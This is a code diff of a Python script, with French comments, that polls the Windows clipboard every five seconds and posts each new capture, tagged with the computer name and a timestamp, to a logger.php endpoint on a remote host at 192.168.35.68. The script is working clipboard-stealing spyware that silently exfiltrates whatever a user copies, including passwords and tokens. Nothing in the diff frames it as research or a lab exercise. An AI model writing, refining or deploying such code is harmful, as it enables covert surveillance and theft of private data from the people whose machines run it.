@@ -5,35 +5,35 @@ import requests
 import time
 import os
 
+date = time.strftime("%Y%m%d_%H%M%S")
+pc_name = os.environ['COMPUTERNAME']
+clip_name = pc_name + "_" + date + '\n'
+global clip_name
+
 def get_clip():
     # Variables
     global data
-    global donnees
-    date = time.strftime("%Y%m%d_%H%M%S")
-    pc_name = os.environ['COMPUTERNAME']
-    clip_name = pc_name + "_" + date + '\n'
-    # Ouverture du Clipboard
-    clip.OpenClipboard()
-    # Récupération du contenu du clipboard
-    data = clip.GetClipboardData()
-    # Fermeture du clipboard pour ne pas impacter la fonction
-    clip.CloseClipboard()
-    donnees = (clip_name + data).replace('\n', '|| ')
+    clip.OpenClipboard()                                        # Ouverture du Clipboard
+    data = clip.GetClipboardData()                              # Récupération du contenu du clipboard
+    clip.CloseClipboard()                                       # Fermeture du clipboard pour ne pas impacter la fonction
+ #   data = data.replace('\n', '|| ')
 
-def send(donnees):
+
+def send(data):
     # AVEC REQUESTS
     url = 'http://192.168.35.68:8080/logger.php?log='
-    url_log = url + donnees
-    res = requests.post(url_log, data=donnees.decode("utf-8"))
+    url_log = url + clip_name + data
+    res = requests.post(url_log, data.decode("utf-8"))
     print(res.text)
 
 def main():
+    dataSent = 'lol'
     while True:
         get_clip()
-        data_sent = ''
-        if data != data_sent :
-            send(donnees)
-            data_sent = data
+        print data + dataSent
+        if data != dataSent:
+            dataSent = data
+            send(data)
         time.sleep(5)
 
 main()
